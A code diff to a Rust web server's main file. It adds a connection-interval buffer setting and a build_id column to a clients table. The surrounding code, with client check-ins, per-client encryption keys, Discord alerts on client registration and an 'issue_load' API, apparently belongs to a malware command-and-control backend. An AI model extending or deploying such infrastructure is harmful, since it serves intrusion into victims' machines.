@@ -54,6 +54,7 @@ use rand;
 
 lazy_static! {
     static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
+    static ref CONNECTION_INTERVAL_BUFFER: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
     static ref PURGATORY_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
     static ref ENABLE_FIREWALL: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
     static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
@@ -73,7 +74,7 @@ lazy_static! {
 const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 
 
-// If the submission is below 512 characters, it will be written to the DB as normal.
+// If tb submission is below 512 characters, it will be written to the DB as normal.
 // If the submission is above 512 characters, it will be written to the disk as a storage.
 
 
@@ -108,6 +109,7 @@ async fn main() -> std::io::Result<()> {
                 &json!({
                     "api_secret": "changeme",
                     "connection_interval": 300,
+                    "connection_interval_buffer": 10,
                     "purgatory_interval": 90,
                     "enable_firewall": false,
                     "host": "127.0.0.1:80",
@@ -162,6 +164,7 @@ async fn main() -> std::io::Result<()> {
     *PRIVATE_KEY.write().unwrap() = RsaPrivateKey::from_pkcs1_pem(&fs::read_to_string("artifacts/keys/private.pem").unwrap()).unwrap();
     *IP_DATABASE.write().unwrap() = geolite_db.unwrap();
     *HOST.write().unwrap() = key_to_string(&parsed_json_config, "host");
+    *CONNECTION_INTERVAL_BUFFER.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval_buffer");
 
     *DISCORD_WEBHOOK_URL.write().unwrap() = key_to_string(&parsed_json_config["webhook"], "url");
     *NOTIFICATION_ON_CLIENT_REGISTRATION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "client_registered");
@@ -187,7 +190,8 @@ async fn main() -> std::io::Result<()> {
             last_seen INTEGER,
             first_seen INTEGER,
             encryption_key TEXT,
-            key_expiration INT
+            key_expiration INT,
+            build_id TEXT
         )  ENGINE=InnoDB;
         ").await.expect("clients table creation failed");
 
@@ -270,7 +274,7 @@ async fn main() -> std::io::Result<()> {
     
     HttpServer::new(move || {
         App::new()
-            .app_data(web::PayloadConfig::default().limit(100000000)) // 500mb
+            .app_data(web::PayloadConfig::default().limit(100000000)) // 500mb (not anymore lol)
             .service(gateway)
             .service(api_issue_load)
             .service(api_clients_list)
